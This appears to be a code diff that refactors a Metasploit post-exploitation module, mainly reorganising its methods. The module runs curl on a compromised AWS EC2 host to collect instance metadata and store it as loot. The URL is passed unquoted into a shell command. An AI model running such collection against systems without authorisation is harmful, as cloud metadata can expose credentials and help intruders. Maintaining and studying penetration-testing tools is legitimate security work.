@@ -28,6 +28,7 @@ class MetasploitModule < Msf::Post
           ]
       )
     )
+
     register_advanced_options(
       [
         OptString.new('TARGETURI', [true, 'AWS EC2 Instance metadata URI', 'http://169.254.169.254/latest/meta-data/ '])
@@ -35,27 +36,18 @@ class MetasploitModule < Msf::Post
     )
   end
 
-  def target_uri
-    begin
-      @target_uri ||= URI(datastore['TARGETURI'])
-    rescue ::URI::InvalidURIError
-      print_error "Invalid URI: #{datastore['TARGETURI'].inspect}"
-      raise Msf::OptionValidateError.new(['TARGETURI'])
-    end
-  end
-
-  def check_curl
-    unless cmd_exec("curl --version") =~ %r{^curl \d}
-      fail_with(Failure::BadConfig, 'curl is not installed')
-    end
-  end
-
   def check_aws_metadata
-    resp = simple_get(target_uri)
+    resp = simple_get(@target_uri)
     unless resp =~ /^instance-id.$/m
       fail_with(Failure::BadConfig, "Session does not appear to be on an AWS EC2 instance")
     end
     resp
+  end
+
+  def check_curl
+    unless cmd_exec("curl --version") =~ /^curl \d/
+      fail_with(Failure::BadConfig, 'curl is not installed')
+    end
   end
 
   def get_aws_metadata(base_uri, base_resp)
@@ -77,15 +69,10 @@ class MetasploitModule < Msf::Post
     r
   end
 
-  def simple_get(url)
-    vprint_status("Fetching #{url}")
-    cmd_exec("curl #{url}")
-  end
-
   def run
     check_curl
     resp = check_aws_metadata
-    metadata = get_aws_metadata(target_uri, resp)
+    metadata = get_aws_metadata(@target_uri, resp)
     metadata_json = JSON.pretty_generate(metadata)
     file = store_loot("aws.ec2.instance.metadata", "text/json", session, metadata_json, "aws_ec2_instance_metadata.json", "AWS EC2 Instance Metadata")
     if datastore['VERBOSE']
@@ -93,5 +80,18 @@ class MetasploitModule < Msf::Post
       print_line(metadata_json)
     end
     print_good("Saved AWS EC2 instance metadata to to #{file}")
+  end
+
+  def setup
+    begin
+      @target_uri ||= URI(datastore['TARGETURI'])
+    rescue ::URI::InvalidURIError
+      fail_with(Failure::BadConfig, "Invalid TARGETURI: #{datastore['TARGETURI']}")
+    end
+  end
+
+  def simple_get(url)
+    vprint_status("Fetching #{url}")
+    cmd_exec("curl #{url}")
   end
 end
